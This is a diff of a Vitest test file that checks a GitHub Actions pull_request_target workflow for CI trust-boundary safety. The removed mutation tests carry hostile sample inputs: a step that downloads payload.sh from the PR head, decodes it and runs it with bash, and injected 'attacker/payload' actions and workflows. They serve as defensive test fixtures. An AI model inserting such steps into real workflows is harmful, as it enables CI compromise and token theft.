@@ -1,134 +1,80 @@
 // SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
 // SPDX-License-Identifier: Apache-2.0
 
-import fs from "node:fs";
-import os from "node:os";
+import { readFileSync } from "node:fs";
 import path from "node:path";
 
 import { describe, expect, it } from "vitest";
+import YAML from "yaml";
 
-import { validateGrowthGuardrailsWorkflowBoundary } from "../tools/growth-guardrails/workflow-boundary.mts";
+const WORKFLOW_PATH = path.resolve(
+  import.meta.dirname,
+  "../.github/workflows/codebase-growth-guardrails.yaml",
+);
+const STATIC_CHECK_ACTION_PATH = path.resolve(
+  import.meta.dirname,
+  "../.github/actions/ci-static-checks/action.yaml",
+);
 
-const ROOT = path.resolve(import.meta.dirname, "..");
-const WORKFLOW_PATH = path.join(ROOT, ".github/workflows/codebase-growth-guardrails.yaml");
+describe("codebase growth guardrails workflow trust boundary", () => {
+  // source-shape-contract: security -- The pull_request_target guardrail must run only the trusted base test and treat pull request files as data
+  it("runs the trusted Vitest guardrails against pull request data", () => {
+    const workflow = YAML.parse(readFileSync(WORKFLOW_PATH, "utf8"));
 
-function workflowSource(): string {
-  return fs.readFileSync(WORKFLOW_PATH, "utf8");
-}
+    expect(workflow).toEqual({
+      name: "CI / Codebase Growth Guardrails",
+      on: {
+        pull_request_target: {
+          types: ["opened", "reopened", "synchronize", "ready_for_review"],
+        },
+      },
+      permissions: { contents: "read", "pull-requests": "read" },
+      jobs: {
+        "codebase-growth-guardrails": {
+          name: "codebase-growth-guardrails",
+          "runs-on": "ubuntu-latest",
+          "timeout-minutes": 5,
+          steps: [
+            {
+              name: "Check out the trusted base revision",
+              uses: "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+              with: {
+                ref: "${{ github.event.pull_request.base.sha }}",
+                "persist-credentials": false,
+              },
+            },
+            {
+              name: "Install trusted dependencies",
+              run: "npm ci --ignore-scripts --no-audit --no-fund",
+            },
+            {
+              name: "Test codebase growth guardrails",
+              env: {
+                NEMOCLAW_GROWTH_PR: "1",
+                GH_TOKEN: "${{ github.token }}",
+                PR_NUMBER: "${{ github.event.pull_request.number }}",
+                REPO: "${{ github.repository }}",
+                BASE_SHA: "${{ github.event.pull_request.base.sha }}",
+                HEAD_REPO: "${{ github.event.pull_request.head.repo.full_name }}",
+                HEAD_SHA: "${{ github.event.pull_request.head.sha }}",
+              },
+              run: "set -euo pipefail\nnpx vitest run --project integration test/growth-guardrails.test.ts\n",
+            },
+          ],
+        },
+      },
+    });
 
-function validateMutation(mutate: (source: string) => string): string[] {
-  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "growth-guardrails-boundary-"));
-  const workflowPath = path.join(tmp, "workflow.yaml");
-  fs.writeFileSync(workflowPath, mutate(workflowSource()));
-  try {
-    return validateGrowthGuardrailsWorkflowBoundary(workflowPath);
-  } finally {
-    fs.rmSync(tmp, { recursive: true, force: true });
-  }
-}
-
-describe("growth-guardrails workflow trust boundary", () => {
-  it("passes on the real workflow", () => {
-    expect(validateGrowthGuardrailsWorkflowBoundary(WORKFLOW_PATH)).toEqual([]);
-  });
-
-  // source-shape-contract: security -- The pull_request_target guardrail must bind the exact trusted execution shape and reject unsafe trigger, permission, checkout, install, action, and shell mutations
-  it.each([
-    [
-      "an untrusted pull_request trigger",
-      (s: string) => s.replace("  pull_request_target:", "  pull_request:"),
-      /must not trigger on pull_request/,
-    ],
-    [
-      "a write permission scope",
-      (s: string) => s.replace("  contents: read", "  contents: write"),
-      /permission contents: write must be read or none/,
-    ],
-    [
-      "a checkout of the PR head",
-      (s: string) =>
-        s.replace(
-          "ref: ${{ github.event.pull_request.base.sha }}",
-          "ref: ${{ github.event.pull_request.head.sha }}",
-        ),
-      /actions\/checkout ref must be/,
-    ],
-    [
-      "a dependency install that runs PR scripts",
-      (s: string) =>
-        s.replace("npm ci --ignore-scripts --no-audit --no-fund", "npm ci --no-audit --no-fund"),
-      /must use --ignore-scripts/,
-    ],
-    [
-      "a dropped trusted tool invocation",
-      (s: string) =>
-        s.replace(
-          "node --experimental-strip-types tools/growth-guardrails/test-conditionals.mts",
-          "echo skip",
-        ),
-      /must invoke the trusted tool: .*test-conditionals\.mts/,
-    ],
-    [
-      "a dropped test-loop tool invocation",
-      (s: string) =>
-        s.replace(
-          "node --experimental-strip-types tools/growth-guardrails/test-loops.mts",
-          "echo skip loops",
-        ),
-      /must invoke the trusted tool: .*test-loops\.mts/,
-    ],
-    [
-      "a resurrected inline node heredoc",
-      (s: string) =>
-        s.replace(
-          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
-          "node <<'NODE'\n          console.log(1)\n          NODE",
-        ),
-      /must match the approved shape/,
-    ],
-    [
-      "a job-level write permission override",
-      (s: string) =>
-        s.replace(
-          "    runs-on: ubuntu-latest\n",
-          "    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n",
-        ),
-      /job codebase-growth-guardrails permission contents: write must be read or none/,
-    ],
-    [
-      "an appended PR-head payload execution in a trusted step",
-      (s: string) =>
-        s.replace(
-          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
-          'node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts\n          gh api "/repos/${HEAD_REPO}/contents/payload.sh?ref=${HEAD_SHA}" --jq .content | base64 -d > "$RUNNER_TEMP/payload.sh"\n          bash "$RUNNER_TEMP/payload.sh"',
-        ),
-      /must match the approved shape/,
-    ],
-    [
-      "an arbitrary action step",
-      (s: string) =>
-        s.replace(
-          "      - name: Check out the trusted base revision",
-          "      - name: Execute an untrusted action\n        uses: attacker/payload@main\n\n      - name: Check out the trusted base revision",
-        ),
-      /must contain exactly 7 approved steps, not 8/,
-    ],
-    [
-      "a non-approved shell field",
-      (s: string) =>
-        s.replace(
-          "        run: npm ci --ignore-scripts --no-audit --no-fund",
-          "        shell: python\n        run: npm ci --ignore-scripts --no-audit --no-fund",
-        ),
-      /must match the approved shape/,
-    ],
-    [
-      "an extra reusable-workflow job",
-      (s: string) =>
-        `${s}\n  untrusted:\n    uses: attacker/payload/.github/workflows/run.yaml@main\n`,
-      /workflow jobs must be exactly codebase-growth-guardrails/,
-    ],
-  ])("flags %s", (_label, mutate, pattern) => {
-    expect(validateMutation(mutate).join("\n")).toMatch(pattern);
+    const action = YAML.parse(readFileSync(STATIC_CHECK_ACTION_PATH, "utf8"));
+    expect(
+      action.runs.steps.filter((step: { name?: string }) => step.name === "Run static hook checks"),
+    ).toEqual([
+      {
+        name: "Run static hook checks",
+        shell: "bash",
+        run: "npx prek run --all-files --stage pre-commit \\\n  --skip source-shape-test-budget \\\n  --skip test-skills-yaml\n",
+      },
+    ]);
+    expect(JSON.stringify(action)).not.toContain("test-size:check");
   });
 });
